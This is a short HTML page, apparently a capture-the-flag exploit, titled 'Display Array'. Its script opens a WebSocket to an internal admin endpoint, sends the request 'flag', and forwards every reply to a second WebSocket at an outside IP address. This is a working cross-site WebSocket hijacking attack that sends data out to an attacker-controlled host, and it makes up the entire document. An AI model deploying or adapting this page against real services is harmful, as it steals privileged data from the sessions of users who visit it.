<!DOCTYPE html>
<html>
	<head>
		 <title>Display Array</title>
	</head>
	<body>
		<div id="messages"></div>
		  <script>
				let socket = new WebSocket("ws://web:8080/admin/ws", 'echo-protocol');
				socket.addEventListener("open", (event) => {
					socket.send("flag");
				});
				socket.addEventListener("message", (event) => {
					let message = event.data
					let sooket = new WebSocket("ws://141.11.246.205:8765");
					sooket.addEventListener("open", (event) => {
						sooket.send(message);
					});
				});
			   </script>
	</body>
</html>
